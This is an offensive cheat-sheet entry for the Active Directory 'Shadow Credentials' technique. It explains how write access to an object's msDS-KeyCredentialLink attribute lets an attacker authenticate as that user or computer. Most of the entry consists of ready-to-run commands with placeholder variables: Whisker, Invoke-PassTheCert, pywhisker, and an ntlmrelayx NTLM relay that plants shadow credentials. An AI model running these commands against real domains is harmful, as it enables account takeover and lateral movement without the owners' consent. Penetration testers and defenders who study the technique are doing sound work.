---
technique: Shadow Credentials
category: kerberos
ace: GenericAll, GenericWrite, WriteProperty (msDS-KeyCredentialLink)
targets: User, Computer
protocols: Kerberos, LDAP
remote_capable: true
tags: kerberos shadow-credentials pkinit msds-keycredentiallink ldap ad
---

# Shadow Credentials

Active Directory objects expose an `msDS-KeyCredentialLink` attribute that can hold raw public keys used for PKINIT (asymmetric Kerberos pre-authentication). An attacker who controls an account with write access to that attribute can generate a key pair, append the public key to the target's attribute, and then authenticate as the target using the corresponding private key, without touching the target's password.

## Required ACEs

| ACE | What it grants |
|-----|----------------|
| GenericAll | Full control of the object |
| GenericWrite | Write to non-protected attributes including msDS-KeyCredentialLink |
| WriteProperty (msDS-KeyCredentialLink) | Direct write to the key credential attribute |

## Windows

### Whisker

#powershell #pkinit #shadow-credentials

Add a key credential to the target's `msDS-KeyCredentialLink` attribute using Whisker.

```powershell title:"Add shadow credential to target via Whisker"
.\Whisker.exe add /target:"$target_samname" /domain:"$domain" /dc:"$dc_fqdn" /path:"cert.pfx" /password:"$pfx_pass"
```
<!-- cheat
import domain_ip
var target_samname
var dc_fqdn
var pfx_pass
-->

### Step 1: Import module (Invoke-PassTheCert shadow creds)

#powershell #certificate #ldaps

Import the Invoke-PassTheCert PowerShell module.

```powershell title:"Import Invoke-PassTheCert module"
Import-Module .\Invoke-PassTheCert.ps1
```
<!-- cheat -->

### Step 2: Get LDAP connection (Invoke-PassTheCert shadow creds)

#powershell #certificate #ldaps

Establish an LDAPS connection using a certificate via Invoke-PassTheCert.

```powershell title:"Get LDAP connection instance via certificate"
$ldap = Invoke-PassTheCert-GetLDAPConnectionInstance -Server "$rhost_ip" -Port 636 -Certificate cert.pfx
```
<!-- cheat
import domain_ip
-->

### Step 3: Exploit shadow credentials (Invoke-PassTheCert)

#powershell #certificate #ldaps

Enumerate or exploit shadow credentials over LDAPS using the Invoke-PassTheCert module.

```powershell title:"Exploit shadow credentials via Invoke-PassTheCert"
Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $ldap -Exploit 'ShadowCreds' -Target "$target_dn"
```
<!-- cheat
var target_dn
-->

## Linux

### pywhisker

#python #pkinit #shadow-credentials

Add a key credential to the target's `msDS-KeyCredentialLink` attribute; the generated certificate can then be used with Pass-the-Certificate to obtain a TGT.

```sh title:"Add shadow credential to target via pywhisker"
pywhisker.py -d "$domain" -u "$user" -p "$pass" --target "$target_samname" --action add
```
<!-- cheat
import domain_ip
import users
import passwords
var target_samname
-->

### ntlmrelayx (relay to shadow creds)

#relay #ntlm #ldap

Relay an incoming NTLM authentication to LDAP and automatically add shadow credentials to the target computer object.

```sh title:"Relay NTLM auth to LDAP to write shadow credentials"
ntlmrelayx.py -t "ldap://$rhost_ip" --shadow-credentials --shadow-target "$target_samname"
```
<!-- cheat
import domain_ip
var target_samname
-->
